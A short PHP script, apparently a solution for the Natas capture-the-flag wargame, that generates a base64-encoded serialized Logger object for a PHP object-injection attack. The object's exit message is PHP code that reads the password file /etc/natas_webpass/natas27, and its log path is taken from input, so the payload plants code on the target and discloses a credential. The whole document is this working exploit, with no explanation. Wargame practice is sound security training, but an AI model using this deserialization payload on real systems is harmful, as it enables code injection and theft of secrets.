<?php
class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    function __construct($dir)
    {
        $this->initMsg = "womp womp";
        $this->exitMsg = "<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        $this->logFile = $dir;
    }
}

$dir = readline();

$drawing = new Logger($dir);

print(base64_encode(serialize($drawing)));